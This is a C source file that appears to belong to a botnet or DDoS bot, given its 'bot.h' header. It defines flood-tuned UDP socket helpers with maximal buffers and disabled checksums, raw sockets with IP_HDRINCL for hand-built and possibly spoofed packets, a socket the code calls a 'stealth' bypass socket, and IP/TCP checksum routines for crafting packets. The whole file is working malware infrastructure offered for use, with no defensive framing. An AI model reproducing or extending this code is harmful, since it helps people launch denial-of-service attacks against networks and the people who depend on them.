#include "bot.h"

/* Dynamic socket buffer size based on free RAM */
static int get_sock_buf(void)
{
    struct sysinfo si;
    if (sysinfo(&si) != 0) return SOCKET_BUF_SIZE_MIN;
    long free_mb = (long)(si.freeram / (1024 * 1024));
    int buf = (int)(free_mb * 1024 * 1024 / 256);
    if (buf < SOCKET_BUF_SIZE_MIN) buf = SOCKET_BUF_SIZE_MIN;
    if (buf > SOCKET_BUF_SIZE_MAX) buf = SOCKET_BUF_SIZE_MAX;
    return buf;
}

/* ── Socket creation helpers ───────────────────── */
int create_udp_socket(void)
{
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return -1;

    int buf = get_sock_buf(), opt = 1;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
    setsockopt(s, SOL_SOCKET, SO_RCVBUF, &buf, sizeof(buf));
    setsockopt(s, SOL_SOCKET, SO_RCVBUFFORCE, &buf, sizeof(buf));
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));

#ifdef SO_ZEROCOPY
    setsockopt(s, SOL_SOCKET, SO_ZEROCOPY, &opt, sizeof(opt));
#endif
#ifdef SO_NO_CHECK
    setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &opt, sizeof(opt));
#endif
#ifdef UDP_CORK
    setsockopt(s, IPPROTO_UDP, UDP_CORK, &opt, sizeof(opt));
#endif

    int mtu_disc = IP_PMTUDISC_DONT;
    setsockopt(s, IPPROTO_IP, IP_MTU_DISCOVER, &mtu_disc, sizeof(mtu_disc));

    int prio = 7;
    setsockopt(s, SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio));

    int tos = IPTOS_THROUGHPUT;
    setsockopt(s, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));

    int busy = 200;
    setsockopt(s, SOL_SOCKET, SO_BUSY_POLL, &busy, sizeof(busy));

    fcntl(s, F_SETFL, O_NONBLOCK);
    return s;
}

int create_raw_socket(int proto)
{
    int s = socket(AF_INET, SOCK_RAW, proto);
    if (s < 0) return -1;
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    int buf = get_sock_buf();
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
    setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));

#ifdef PACKET_QDISC_BYPASS
    setsockopt(s, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
#endif

    int prio = 7;
    setsockopt(s, SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio));
    int tos = IPTOS_THROUGHPUT;
    setsockopt(s, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));
    return s;
}

/* Bypass-tuned UDP socket (stealth: low priority, TTL, timeout) */
int create_bypass_socket(void)
{
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return -1;
    int sndbuf = get_sock_buf() / 8;
    if (sndbuf < 65536) sndbuf = 65536;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    int reuse = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
    int priority = 2;
    setsockopt(s, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));
    int tos = 0x08;
    setsockopt(s, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));
    struct timeval tv = {2, 0};
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    int ttl = 64;
    setsockopt(s, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
    fcntl(s, F_SETFL, O_NONBLOCK);
    return s;
}

/* ── Checksums ─────────────────────────────────── */
uint16_t ip_csum(void *d, size_t l)
{
    uint16_t *p = (uint16_t *)d;
    uint32_t a = 0;
    for (size_t i = 0; i < l / 2; i++) a += p[i];
    if (l & 1) a += ((uint8_t *)d)[l - 1];
    while (a >> 16) a = (a & 0xFFFF) + (a >> 16);
    return ~a;
}

uint16_t tcp_csum(void *ip, void *tcp)
{
    struct iphdr *iph = (struct iphdr *)ip;
    struct tcphdr *tcph = (struct tcphdr *)tcp;
    struct {
        uint32_t sa, da;
        uint8_t z;
        uint8_t pr;
        uint16_t tl;
    } ps = {iph->saddr, iph->daddr, 0, IPPROTO_TCP, htons(sizeof(struct tcphdr))};
    uint32_t a = 0;
    uint16_t *p = (uint16_t *)&ps;
    for (size_t i = 0; i < sizeof(ps) / 2; i++) a += p[i];
    p = (uint16_t *)tcp;
    for (size_t i = 0; i < sizeof(struct tcphdr) / 2; i++) a += p[i];
    while (a >> 16) a = (a & 0xFFFF) + (a >> 16);
    return ~a;
}
